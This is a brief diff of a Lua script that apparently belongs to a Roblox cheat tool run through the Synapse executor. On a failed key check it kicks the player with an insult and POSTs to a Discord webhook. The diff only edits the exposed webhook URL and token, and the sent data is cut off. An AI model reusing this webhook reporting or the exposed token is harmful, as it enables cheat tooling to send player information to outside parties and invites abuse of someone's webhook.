@@ -3,8 +3,8 @@ local i = _G.Key
 if i ~= _G.PassCode then
         game.Players.LocalPlayer:Kick("Wrong key dumb fuck")
         
-           syn.request({
-       Url = "https://discord.com/api/webhooks/1051685076599054377/p9ZHboO2kOdzsslRYCW7F_MJ_1urjoKNnozZjCB_vVIRmpnx-dGgbBfPDLBj3WZokobvz",
+   syn.request({
+       Url = "https://discord.com/api/webhooks/1051685076599054377/p9ZHboO2kOdzsslRYCW7F_MJ_1urjoKNnozZjCB_vVIRmpnx-dGgbBfPDLBj3WZokobv",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
